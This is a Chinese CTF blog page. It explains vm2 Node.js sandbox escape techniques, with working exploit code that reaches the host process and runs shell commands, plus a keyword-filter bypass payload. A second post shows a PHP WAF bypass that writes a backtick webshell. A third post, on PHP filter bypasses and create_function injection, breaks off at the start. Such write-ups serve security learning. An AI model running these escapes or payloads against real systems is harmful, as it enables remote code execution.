<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">此时会被代理的se方法拦截</span><br><span class="line"></span><br><span class="line">此时的value是一个函数，Decontextify.value 针对其进行了封装，返回一个函数的代理对象，就是说a.i为一个函数的代理对象，而且这个函数的代理对象中</span><br></pre></td></tr></table></figure>
<p>constructor属性返回的会是host.function</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">所以当我们执行最后一行代码时</span><br></pre></td></tr></table></figure>
<p>console.log(a.i);</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">会被代理的get方法拦截，但是vm2的作者通过contextify.value取出被代理之前的对象，最终还是得到原来的函数，所以无法获得被代理的函数对象</span><br><span class="line"></span><br><span class="line">## vm2沙箱逃逸的原理</span><br><span class="line"></span><br><span class="line">有两种逃逸方法</span><br><span class="line"></span><br><span class="line">### 第一种vm2逃逸方法</span><br><span class="line"></span><br><span class="line">它在proxy机制中没有定义has方法，所以我们可以在外部定义has方法，从而让它在触发has方法时调用外部的has方法，而在外部的has方法中可以通过</span><br></pre></td></tr></table></figure>
<p>process = t.constructor(“return process”)();</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">来访问原型链中的construct属性，从而获得function，使用内置函数执行恶意代码</span><br><span class="line"></span><br><span class="line">我们可以通过这个例子来理解一下has方法的触发</span><br></pre></td></tr></table></figure>
<p>var handler = {<br>    get () {<br>     console.log(“get”);<br>    }<br>  };</p>
<p>  var target = {};</p>
<p>  var proxy = new Proxy(target, handler);</p>
<p>  Object.prototype.has = function(){<br>    console.log(“has”);<br>  }</p>
<p>  proxy.a; //触发get<br>  “” in proxy; //触发has，这个has是在原型链上定义的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可见在对象target定义了get操作，所以当时使用proxy.a时会打印出get，而当&quot;&quot; in proxy时，由于target对象中没有直接定义has进行拦截，所以会调用外部的has拦截，从而输出has</span><br><span class="line"></span><br><span class="line">案例1</span><br></pre></td></tr></table></figure>
<p>var handler = {<br>    get () {<br>     console.log(“get”);<br>    }<br>  };</p>
<p>  var target = {};</p>
<p>  var proxy = new Proxy(target, handler);</p>
<p>  Object.prototype.has = function(){<br>    console.log(“has”);<br>  }</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于Buffer.from是一个代理对象，但是在vm2内部的Object中没有has方法，所以我们可以自己给Object对象的原型中添加has方法，这时候运行</span><br></pre></td></tr></table></figure>
<p>“” in Buffer.from</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">就会执行我们自定义的has方法，由于proxy机制，参数t为function Buffer.from，而这个function时在外部，其上下文是 nodejs 的global下，所以访问其 constructor 属性就获取到了外部的 Function，从而拿到外部的 process</span><br><span class="line"></span><br><span class="line">修补方法是在Buffer.from中加入has方法，就不会在原型链中查找constructor 属性</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 第二种vm2逃逸方法</span><br><span class="line"></span><br><span class="line">我们可以利用Object.defineProperty来设置对象的访问器属性</span><br><span class="line"></span><br><span class="line">就是本来代码</span><br></pre></td></tr></table></figure>
<p>var obj = {<br>    prop: let obj = {<br>    prop:123,<br>    Writable: true<br>}</p>
<p>let jbo = {<br>    get prop(){<br>        return “get”;<br>    },<br>    set prop(val){<br>        console.log(“set”+val);<br>    }<br>}</p>
<p>console.log(obj.prop); //123<br>console.log(jbo.prop); //get</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">但是我们可以利用Object.defineProperty</span><br></pre></td></tr></table></figure>
<p>let obj = {};<br>Object.defineProperty(obj, “prop”, {<br>    get get(){<br>        console.log(“get1”); //get1<br>        return ()=&gt;{return “get2”};<br>    }<br>})<br>console.log(obj.prop); //get2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此时会先执行get()函数，打印出get1，返回一个函数，作为prop属性的getter，之后访问obj.prop会打印出get2，然后我们再看vm2逃逸的代码</span><br></pre></td></tr></table></figure>
<p>var process;<br>try {<br>    let a = Buffer.from(“”)<br>    Object.defineProperty(a, “”, {<br>        get set() {<br>            Object.defineProperty(Object.prototype, “get”, {<br>                get: function get() {<br>                    throw function (x) {<br>                        return x.constructor(“return process”)();<br>                    };<br>                }<br>            });<br>            return ()=&gt;{};<br>        }</p>
<pre><code>&#125;);
</code></pre>
<p>} catch (e) {<br>    process = e(() =&gt; {});<br>}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">执行的过程</span><br></pre></td></tr></table></figure>
<pre><code>                  同时”异步执行在Object.prototype上添加get属性“
                                                                   /
</code></pre>
<p>“Buffer.from(“”)返回一个代理对象a”—&gt;”Object.defineProperty在a上添加属性，被代理的defineProerty拦截“–&gt;vm2内部访问到Object.prototype.get时”—&gt;”vm2内部抛出异常并被捕获“–&gt;“vm2再次抛出异常e”—&gt;”捕获vm2内部的异常“–&gt;执行e(()=&gt;{})逃逸</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">此时a是一个代理对象，当我们在a上定义新属性时会被defineProperty拦截，而在defineProperty中有一串代码会检测descriptor上是否设置了get和set，如果是，则会调用外部的host.Object.defineProperty 去实现设置对象属性</span><br><span class="line"></span><br><span class="line">但是在执行decriptor.get时，由于nodejs是异步的，所以会触发</span><br></pre></td></tr></table></figure>
<p>Object.defineProperty(Object.prototype, “get”, {<br>                get: function get() {<br>                    throw function (x) {<br>                        return x.constructor(“return process”)();<br>                    };<br>                }<br>            });</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">抛出异常</span><br></pre></td></tr></table></figure>
<p>throw x=&gt;x.constructor(“return process”)();</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">而这个异常会被vm2内部捕获，就是这里的e</span><br></pre></td></tr></table></figure>
<p>}catch(e){<br>    throw Contextify.value(e);<br>}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后vm2会将这个抛出的异常包装成一个代理对象之后，继续抛出，最后被我们的代码捕获</span><br></pre></td></tr></table></figure>
<p>}catch(e){<br>    let k=()=&gt;{};<br>    process=e(k);<br>}<br>然后会将其作为函数来调用，就会触发这个函数代理对象的apply方法，此时apply方法中的target为x=&gt;x.constructor(‘return process’)()，context是函数的上下文代理，通过Decontextify.value 之后是 underfined，然后args是函数的参数代理，其值为()=&gt;{}，然后会先将函数的参数进行一次处理，然后反射调用函数，并将得到结果包装成代理对象，即函数的参数()=&gt;{}是一个函数，不是代理对象，所以decontextify将其做了一次包装后，成为一个代理对象，然后这个代理对象触发get方法后的constructor属性返回host.function，所以导致了沙箱逃逸</p>
<h2 id="实例just-escape"><a href="#实例just-escape" class="headerlink" title="实例just escape"></a>实例just escape</h2><p>打开页面，发现有提示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/run.php?code=(2%2b6-7)/3</span><br><span class="line"></span><br><span class="line">/run.php?code=new%20Date()</span><br></pre></td></tr></table></figure>
<p>然后构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/run.php</span><br></pre></td></tr></table></figure>
<p>发现有源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( array_key_exists( &quot;code&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;code&#x27; ] != NULL ) &#123;</span><br><span class="line">    $code = $_GET[&#x27;code&#x27;];</span><br><span class="line">    echo eval(code);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>此时，我们直接构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
<p>发现有过滤，然后再仔细查看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">真的是php嘛</span><br></pre></td></tr></table></figure>
<p>这句话，我们可以推测可能是其它，而nodejs也有eval()函数，所以使用Error().stack测试，发现报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error at vm.js:1:1 at Script.runInContext (vm.js:131:20) at VM.run (/app/node_modules/vm2/lib/main.js:219:62) at /app/server.js:51:33 at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at next (/app/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at /app/node_modules/express/lib/router/index.js:281:22 at Function.process_params (/app/node_modules/express/lib/router/index.js:335:12)</span><br></pre></td></tr></table></figure>
<p>从报错中的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error at vm.js:1:1</span><br></pre></td></tr></table></figure>
<p>我们可以猜测可能是vm2沙箱逃逸，所以我们可以利用vm2沙箱逃逸来执行恶意代码，所以我们可以使用以下exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">const &#123;VM&#125; = require(&#x27;vm2&#x27;);</span><br><span class="line">const untrusted = &#x27;(&#x27; + function()&#123;</span><br><span class="line">	TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();</span><br><span class="line">	try&#123;</span><br><span class="line">		Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;</span><br><span class="line">	&#125;catch(e)&#123;</span><br><span class="line">		return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;+&#x27;)()&#x27;;</span><br><span class="line">try&#123;</span><br><span class="line">	console.log(new VM().run(untrusted));</span><br><span class="line">&#125;catch(x)&#123;</span><br><span class="line">	console.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>或者使用以下exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">const &#123;VM&#125; = require(&#x27;vm2&#x27;);</span><br><span class="line">const untrusted = &#x27;(&#x27; + function()&#123;</span><br><span class="line">	try&#123;</span><br><span class="line">		Buffer.from(new Proxy(&#123;&#125;, &#123;</span><br><span class="line">			getOwnPropertyDescriptor()&#123;</span><br><span class="line">				throw f=&gt;f.constructor(&quot;return process&quot;)();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;));</span><br><span class="line">	&#125;catch(e)&#123;</span><br><span class="line">		return e(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;+&#x27;)()&#x27;;</span><br><span class="line">try&#123;</span><br><span class="line">	console.log(new VM().run(untrusted));</span><br><span class="line">&#125;catch(x)&#123;</span><br><span class="line">	console.log(x);</span><br><span class="line">&#125;</span><br><span class="line">```           </span><br><span class="line"></span><br><span class="line">其实简单的说就是利用()=&gt;&#123;&#125;这个函数被包装成代理对像，而这个代理对象中的get方法的constructor属性的返回值为host.function，所以利用其来使用内置类来执行恶意代码</span><br><span class="line"></span><br><span class="line">但是这里有对特殊字母有过滤</span><br></pre></td></tr></table></figure>
<p>for, while, process, exec, eval, constructor, prototype, Function</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">所以我们可以利用在关键字母上加反引号`来绕过</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者使用$&#123;$&#123;prototyp&#125;e&#125;来绕过，即</span><br></pre></td></tr></table></figure>
<p>/run.php?code=(function (){<br>    TypeError[<code>$&#123;</code>${<code>prototyp</code>}e<code>&#125;</code>][<code>$&#123;</code>${<code>get_proces</code>}s<code>&#125;</code>] = f=&gt;f[<code>$&#123;</code>${<code>constructo</code>}r<code>&#125;</code>](<code>$&#123;</code>${<code>return this.proces</code>}s<code>&#125;</code>)();<br>    try{<br>        Object.preventExtensions(Buffer.from(``)).a = 1;<br>    }catch(e){<br>        return e<a href="()=%3E%7B%7D"><code>$&#123;</code>${<code>get_proces</code>}s<code>&#125;</code></a>.mainModule<a href="%60$%7B%60$%7B%60child_proces%60%7Ds%60%7D%60"><code>$&#123;</code>${<code>requir</code>}e<code>&#125;</code></a>[<code>$&#123;</code>${<code>exe</code>}cSync<code>&#125;</code>](<code>cat /flag</code>).toString();<br>    }<br>})()</p>
<p>```<br>即可得到flag</p>
<p>参考文章：[<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/207291]">https://www.anquanke.com/post/id/207291]</a></p>
<pre><code>[https://www.anquanke.com/post/id/207283]

[https://es6.ruanyifeng.com/?search=weakmap&amp;x=0&amp;y=0#docs/proxy]

[https://github.com/patriksimek/vm2/issues/225]    

[https://www.freesion.com/article/92951402280/]                                            
</code></pre>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nodejs/" rel="tag">nodejs</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-反引号的使用以及php短标签" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/10/11/%E5%8F%8D%E5%BC%95%E5%8F%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8Aphp%E7%9F%AD%E6%A0%87%E7%AD%BE/" class="article-date">
  	<time datetime="2021-10-10T16:00:00.000Z" itemprop="datePublished">2021-10-11</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/10/11/%E5%8F%8D%E5%BC%95%E5%8F%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8Aphp%E7%9F%AD%E6%A0%87%E7%AD%BE/">
        反引号的使用以及php短标签
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="反引号的使用以及php短标签"><a href="#反引号的使用以及php短标签" class="headerlink" title="反引号的使用以及php短标签"></a>反引号的使用以及php短标签</h1><p>打开页面，发现是源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">function check($input)&#123;</span><br><span class="line">    if(preg_match(&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;,$input))&#123;</span><br><span class="line">        // if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span><br><span class="line">        die(&#x27;hacker!!!&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function waf($input)&#123;</span><br><span class="line">  if(is_array($input))&#123;</span><br><span class="line">      foreach($input as $key=&gt;$output)&#123;</span><br><span class="line">          $input[$key] = waf($output);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">      $input = check($input);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = &#x27;sandbox/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;/&#x27;;</span><br><span class="line">if(!file_exists($dir))&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123;</span><br><span class="line">    case &#x27;pwd&#x27;:</span><br><span class="line">        echo $dir;</span><br><span class="line">        break;</span><br><span class="line">    case &#x27;upload&#x27;:</span><br><span class="line">        $data = $_GET[&quot;data&quot;] ?? &quot;&quot;;</span><br><span class="line">        waf($data);</span><br><span class="line">        file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>我们可以看见源码中有两个自定义函数waf()和check()函数</p>
<p>对于第一个waf()函数，我们可以知道</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function waf($input)&#123;</span><br><span class="line">  if(is_array($input))&#123;</span><br><span class="line">      foreach($input as $key=&gt;$output)&#123;</span><br><span class="line">          $input[$key] = waf($output);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">      $input = check($input);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当输入的值为数组时会进入一个死循环，而当输入的值部位数组时，会进入check()函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function check($input)&#123;</span><br><span class="line">    if(preg_match(&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;,$input))&#123;</span><br><span class="line">        // if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span><br><span class="line">        die(&#x27;hacker!!!&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可见正则过滤了空格、下划线、^、+、eval、{、}，且由于是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ /i</span><br></pre></td></tr></table></figure>
<p>所以是不区分大小写，而对于主体代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$dir = &#x27;sandbox/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;/&#x27;;</span><br><span class="line">if(!file_exists($dir))&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123;</span><br><span class="line">    case &#x27;pwd&#x27;:</span><br><span class="line">        echo $dir;</span><br><span class="line">        break;</span><br><span class="line">    case &#x27;upload&#x27;:</span><br><span class="line">        $data = $_GET[&quot;data&quot;] ?? &quot;&quot;;</span><br><span class="line">        waf($data);</span><br><span class="line">        file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可知，当?action=pwd时，会回显路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sandbox/f2f0c289641ba52db7d0edeb85513ada/</span><br></pre></td></tr></table></figure>
<p>而我们?action=upload时，会将$data的内容写入到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sandbox/f2f0c289641ba52db7d0edeb85513ada/index.php</span><br></pre></td></tr></table></figure>
<p>所以我们可以利用这个一点来构造恶意代码，但是它过滤了php，所以我们可以使用php的短标签</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= ?&gt;相当于&lt;?echo ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;? ?&gt;</span><br></pre></td></tr></table></figure>
<p>而php有一个特性，就是当php代码中有反引号闭合的，就会将反引号闭合的当作是shell命令执行，相当于shell_exec()，所以当禁用shell_exec()时失效</p>
<p>因此可以构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=&lt;?`cat%09*`?&gt;</span><br></pre></td></tr></table></figure>
<p>其中%09是绕过空格过滤的，这样即可读出flag</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-$_SERVER[&#39;QUERY_STRING&#39;]绕过以及 y1ngzuishuai 的正则匹配绕过以及$_REQUEST 的字母匹配绕过以及sha1()函数绕过以及create_function () 代码注入" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/10/10/$_SERVER%5B'QUERY_STRING'%5D%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8A%20y1ngzuishuai%20%E7%9A%84%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8A$_REQUEST%20%E7%9A%84%E5%AD%97%E6%AF%8D%E5%8C%B9%E9%85%8D%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8Asha1()%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8Acreate_function%20()%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/" class="article-date">
  	<time datetime="2021-10-09T16:00:00.000Z" itemprop="datePublished">2021-10-10</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/10/10/$_SERVER%5B'QUERY_STRING'%5D%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8A%20y1ngzuishuai%20%E7%9A%84%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8A$_REQUEST%20%E7%9A%84%E5%AD%97%E6%AF%8D%E5%8C%B9%E9%85%8D%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8Asha1()%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8Acreate_function%20()%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/">
        $_SERVER[&#39;QUERY_STRING&#39;]绕过以及 y1ngzuishuai 的正则匹配绕过以及$_REQUEST 的字母匹配绕过以及sha1()函数绕过以及create_function () 代码注入
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="SERVER-‘QUERY-STRING’-绕过以及-y1ngzuishuai-的正则匹配绕过以及-REQUEST-的字母匹配绕过以及sha1-函数绕过以及create-function-代码注入"><a href="#SERVER-‘QUERY-STRING’-绕过以及-y1ngzuishuai-的正则匹配绕过以及-REQUEST-的字母匹配绕过以及sha1-函数绕过以及create-function-代码注入" class="headerlink" title="$_SERVER[‘QUERY_STRING’]绕过以及 y1ngzuishuai 的正则匹配绕过以及$_REQUEST 的字母匹配绕过以及sha1()函数绕过以及create_function () 代码注入"></a>$_SERVER[‘QUERY_STRING’]绕过以及 y1ngzuishuai 的正则匹配绕过以及$_REQUEST 的字母匹配绕过以及sha1()函数绕过以及create_function () 代码注入</h1><p>打开页面，发现是源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line">$file = &quot;1nD3x.php&quot;;</span><br><span class="line">$shana = $_GET[&#x27;shana&#x27;];</span><br><span class="line">$passwd = $_GET[&#x27;passwd&#x27;];</span><br><span class="line">$arg = &#x27;&#x27;;</span><br><span class="line">$code = &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if($_SERVER) &#123; </span><br><span class="line">    if (</span><br><span class="line">        